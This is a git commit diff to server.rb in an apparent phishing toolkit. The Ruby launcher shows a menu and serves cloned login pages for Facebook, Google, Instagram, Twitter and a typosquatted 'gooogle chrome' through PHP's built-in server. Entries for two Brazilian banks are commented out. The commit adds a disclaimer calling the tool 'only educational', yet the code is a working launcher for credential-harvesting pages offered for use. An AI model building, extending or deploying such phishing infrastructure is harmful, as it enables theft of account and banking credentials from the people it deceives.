7ba3ba0d3c0a7858bce8455ea68b244519e82679
th3void <chmodxxzrxx@gmail.com>
2020-11-13 20:59:42 -0300

    update server.rb

--- server.rb
+++ server.rb
@@ -12,6 +12,10 @@ require_relative './modules/colors.rb'
 
 include Colors
 
+# Warning: I am not responsible for the way that this software 
+# will be used by third parties. The purpose of this software 
+# is only educational.
+
 puts "\n\n"
 prYellow '  /$$$$$$                                                   '
 prYellow ' /$$__  $$                                                  '
@@ -27,10 +31,13 @@ prYellow '                                                            '
 puts "\n\n"
 prYellow "============================================================="
 prYellow "[0] Exit"
-prYellow "[1] Facebook login page"
-prYellow "[2] Gmail login page"
-prYellow "[3] Simple Logger"
-prYellow "[4] Katana web page"
+#prYellow "[1] banco do brazil"
+prYellow "[2] facebook"
+prYellow "[3] gooogle chrome"
+#prYellow "[4] caixa economica federal"
+prYellow "[5] google"
+prYellow "[6] instagram"
+prYellow "[7] twitter"
 prYellow "============================================================="
 
 PS1 = "\033[92m #{'[SimpleServer]::[LETK]$ '}\033[00m"
@@ -43,13 +50,20 @@ case cmd
 when '0'
 	exit
 when '1'
-	system "cd ./pages/facebook.com && php -S #{ip_port}"
+	#system "cd ./pages/banco-do-brazil.com.br  && php -S #{ip_port}"
 when '2'
-	system "cd ./pages/gmail.com && php -S #{ip_port}"
+	system "cd ./pages/facebook.com && php -S #{ip_port}"
 when '3'
-	system "cd ./pages/logger && php -S #{ip_port}"
+	system "cd ./pages/gooogle-chrome.com && php -S #{ip_port}"
 when '4'
-	system "cd ./pages/katana-web-kit && php -S #{ip_port}"
+	#system "cd ./pages/caixa-economica-federal.com && php -S #{ip_port}"
+when '5'
+	system "cd ./pages/google.com && php -S #{ip_port}"
+when '6'
+	system "cd ./pages/instagram.com && php -S #{ip_port}"
+when '7'
+	system "cd ./pages/twitter.com && php -S #{ip_port}"
+
 else 
 	prRed '[COMMAND_ERROR]: Invalid'
 	exit
